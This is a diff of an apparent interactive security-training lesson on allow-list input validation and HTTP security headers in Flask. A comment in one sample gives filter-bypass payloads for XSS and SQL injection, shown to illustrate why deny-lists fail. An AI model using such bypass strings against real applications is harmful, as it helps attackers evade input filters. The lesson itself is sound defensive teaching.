     section_header("Lesson 5: Input Validation & Security Headers")
+    learning_goal([
+        "Learn whitelist vs blacklist validation",
+        "Build multi-layer input validation",
+        "Understand essential security headers and how to set them",
+    ])
     disclaimer()
 
     lesson_block(
-        "Input validation is the process of ensuring that user-supplied data "
-        "conforms to expected formats before processing it. Security headers are "
-        "HTTP response headers that instruct browsers to enable protective "
-        "mechanisms. Together, they form two critical layers of defense."
+        "Input validation ensures that user-supplied data conforms to expected "
+        "formats before processing it. Security headers tell browsers to enable "
+        "protective mechanisms."
+    )
+    lesson_block(
+        "Together, they form two critical layers of defense for any web app."
     )
 
     why_it_matters(
-        "Most web vulnerabilities — SQLi, XSS, command injection, path traversal "
-        "— exploit insufficient input validation. Security headers are a free, "
-        "easy-to-implement defense layer that significantly reduces the attack "
-        "surface. Compliance frameworks like PCI DSS and SOC 2 check for both."
+        "Most web vulnerabilities -- SQLi, XSS, command injection -- exploit "
+        "insufficient input validation. Security headers are a free, easy-to-add "
+        "defense layer. Compliance frameworks like PCI DSS and SOC 2 check for both."
     )
 
+    pace()
     press_enter()
 
     # ── Whitelist vs Blacklist ──
     sub_header("Whitelist vs. Blacklist Validation")
     lesson_block(
-        "Blacklist (deny-list) validation tries to block known-bad input, such as "
-        "filtering out <script> tags. This approach is fragile because attackers "
-        "constantly find bypasses (e.g., <ScRiPt>, <img onerror=...>, unicode "
-        "tricks). Whitelist (allow-list) validation defines exactly what IS "
-        "allowed and rejects everything else. Whitelisting is always preferred."
+        "Blacklist (deny-list) validation tries to block known-bad input, like "
+        "filtering out <script> tags. This is fragile because attackers constantly "
+        "find bypasses."
     )
+    lesson_block(
+        "Whitelist (allow-list) validation defines exactly what IS allowed and "
+        "rejects everything else. Whitelisting is always preferred."
+    )
+    tip("Think: 'only allow good input' instead of 'try to block bad input'.")
+    pace()
+
     code_block(
         'import re\n'
         '\n'
@@ -1002,8 +1178,12 @@ def lesson_input_val_headers(progress, module_key):
         '    for bad in blacklist:\n'
         '        cleaned = cleaned.replace(bad, "")\n'
         '    return cleaned\n'
-        '    # Bypass: <scr<script>ipt>  or  OR/**/1=1\n'
-        '\n'
+        '    # Bypass: <scr<script>ipt>  or  OR/**/1=1',
+        "python"
+    )
+    pace()
+
+    code_block(
         '# GOOD: Whitelist approach — only allow expected patterns\n'
         'def validate_username(username):\n'
         '    """Allow only alphanumeric characters and underscores, 3-30 chars."""\n'
@@ -1016,8 +1196,12 @@ def lesson_input_val_headers(progress, module_key):
         '    pattern = r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$"\n'
         '    if re.match(pattern, email):\n'
         '        return email\n'
-        '    raise ValueError("Invalid email format")\n'
-        '\n'
+        '    raise ValueError("Invalid email format")',
+        "python"
+    )
+    pace()
+
+    code_block(
         'def validate_age(age_str):\n'
         '    """Accept only integers in a reasonable range."""\n'
         '    age = int(age_str)  # Raises ValueError if not an integer\n'
@@ -1026,6 +1210,7 @@ def lesson_input_val_headers(progress, module_key):
         '    raise ValueError("Age out of range")',
         "python"
     )
+    pace()
 
     press_enter()
 
@@ -1033,11 +1218,12 @@ def lesson_input_val_headers(progress, module_key):
     sub_header("Comprehensive Input Validation Strategy")
     lesson_block(
         "Effective input validation operates at multiple levels: (1) Client-side "
-        "validation for user experience (but NEVER for security — it can be "
-        "bypassed). (2) Server-side validation for all data before processing. "
-        "(3) Database-level constraints as a final safety net. Always validate "
-        "type, length, format, and range."
+        "for user experience (but NEVER for security). (2) Server-side for all "
+        "data before processing. (3) Database-level constraints as a safety net."
     )
+    tip("Always validate type, length, format, and range.")
+    pace()
+
     code_block(
         'from flask import Flask, request, abort\n'
         'import re\n'
@@ -1054,12 +1240,16 @@ def lesson_input_val_headers(progress, module_key):
         '    if len(query) > 200:\n'
         '        raise ValueError("Query too long")\n'
         '\n'
-        '    # 3. Character whitelist — allow letters, numbers, spaces, hyphens\n'
+        '    # 3. Character whitelist\n'
         '    if not re.match(r"^[a-zA-Z0-9\\s\\-]+$", query):\n'
         '        raise ValueError("Query contains invalid characters")\n'
         '\n'
-        '    return query.strip()\n'
-        '\n'
+        '    return query.strip()',
+        "python"
+    )
+    pace()
+
+    code_block(
         '@app.route("/search")\n'
         'def search():\n'
         '    raw_query = request.args.get("q", "")\n'
@@ -1074,6 +1264,8 @@ def lesson_input_val_headers(progress, module_key):
         "python"
     )
 
+    nice_work("You understand input validation -- now let's look at security headers!")
+    pace()
     press_enter()
 
     # ── Security Headers ──
@@ -1081,10 +1273,9 @@ def lesson_input_val_headers(progress, module_key):
 
     info(f"{BRIGHT}1. Content-Security-Policy (CSP){RESET}")
     lesson_block(
-        "CSP controls which resources the browser is allowed to load, providing "
-        "a strong defense against XSS and data injection attacks. A strict CSP "
-        "policy can prevent inline scripts from executing, even if an attacker "
-        "manages to inject them into the page."
+        "CSP controls which resources the browser is allowed to load. A strict "
+        "CSP can prevent inline scripts from executing, even if an attacker "
+        "injects them into the page."
     )
     code_block(
         "# Strict CSP header — only allow resources from the same origin\n"
@@ -1097,28 +1288,26 @@ def lesson_input_val_headers(progress, module_key):
         "frame-ancestors 'none'",
         "http"
     )
+    pace()
 
     info(f"{BRIGHT}2. Strict-Transport-Security (HSTS){RESET}")
     lesson_block(
-        "HSTS tells the browser to ONLY communicate with the server over HTTPS, "
-        "even if the user types http:// in the address bar. This prevents "
-        "SSL-stripping attacks where a man-in-the-middle downgrades the connection "
-        "to HTTP. The max-age directive specifies how long the browser should "
-        "remember this rule."
+        "HSTS tells the browser to ONLY communicate over HTTPS, even if the "
+        "user types http://. This prevents SSL-stripping attacks."
     )
     code_block(
         "# HSTS header — enforce HTTPS for 1 year, include subdomains\n"
         "Strict-Transport-Security: max-age=31536000; includeSubDomains; preload",
         "http"
     )
+    pace()
 
     press_enter()
 
     info(f"{BRIGHT}3. X-Frame-Options{RESET}")
     lesson_block(
         "X-Frame-Options prevents your page from being embedded in an iframe, "
-        "defending against clickjacking attacks where an attacker overlays your "
-        "page with a transparent frame to trick users into clicking hidden buttons."
+        "defending against clickjacking attacks."
     )
     code_block(
         "# Prevent any framing of your page\n"
@@ -1128,17 +1317,18 @@ def lesson_input_val_headers(progress, module_key):
         "X-Frame-Options: SAMEORIGIN",
         "http"
     )
+    pace()
 
     info(f"{BRIGHT}4. X-Content-Type-Options{RESET}")
     lesson_block(
-        "This header prevents browsers from MIME-type sniffing, which can lead to "
-        "security vulnerabilities when a browser interprets a file differently "
-        "than intended (e.g., treating a text file as JavaScript)."
+        "This header prevents browsers from MIME-type sniffing, which can cause "
+        "security issues when a browser interprets a file differently than intended."
     )
     code_block(
         "X-Content-Type-Options: nosniff",
         "http"
     )
+    pace()
 
     info(f"{BRIGHT}5. Referrer-Policy{RESET}")
     lesson_block(
@@ -1151,10 +1341,13 @@ def lesson_input_val_headers(progress, module_key):
         "http"
     )
 
+    nice_work("You now know the five essential security headers!")
+    pace()
     press_enter()
 
     # ── Setting headers in Flask ──
     sub_header("Setting Security Headers in Flask")
+    lesson_block("Here is how to add all the headers at once using Flask's after_request hook:")
     code_block(
         'from flask import Flask\n'
         '\n'
@@ -1170,7 +1363,12 @@ def lesson_input_val_headers(progress, module_key):
         '    )\n'
         '    response.headers["Strict-Transport-Security"] = (\n'
         '        "max-age=31536000; includeSubDomains"\n'
-        '    )\n'
+        '    )',
+        "python"
+    )
+    pace()
+
+    code_block(
         '    response.headers["X-Frame-Options"] = "DENY"\n'
         '    response.headers["X-Content-Type-Options"] = "nosniff"\n'
         '    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"\n'
@@ -1182,6 +1380,8 @@ def lesson_input_val_headers(progress, module_key):
         '    return response',
         "python"
     )
+    tip("You can copy this pattern into any Flask app for instant security improvement.")
+    pace()
 
     press_enter()
 
@@ -1189,8 +1389,9 @@ def lesson_input_val_headers(progress, module_key):
     sub_header("How to Check Security Headers")
     lesson_block(
         "You can check security headers using command-line tools, Python, or "
-        "online scanners. Here are several methods:"
+        "online scanners."
     )
+
     code_block(
         '# Method 1: curl from the command line\n'
         '# curl -I https://example.com\n'
@@ -1205,8 +1406,12 @@ def lesson_input_val_headers(progress, module_key):
         '    "X-Frame-Options",\n'
         '    "Referrer-Policy",\n'
         '    "Permissions-Policy",\n'
-        ']\n'
-        '\n'
+        ']',
+        "python"
+    )
+    pace()
+
+    code_block(
         'def audit_headers(url):\n'
         '    """Check a URL for security headers."""\n'
         '    resp = requests.get(url, timeout=10)\n'
@@ -1227,6 +1432,7 @@ def lesson_input_val_headers(progress, module_key):
         'audit_headers("http://localhost:5050")',
         "python"
     )
+    pace()
 
     press_enter()
 
@@ -1241,6 +1447,7 @@ def lesson_input_val_headers(progress, module_key):
         "these attacks. This is a textbook example of why X-Frame-Options and CSP "
         "frame-ancestors matter."
     )
+    pace()
 
     # ── Practice challenge ──
     sub_header("Practice Challenge: Header Audit")
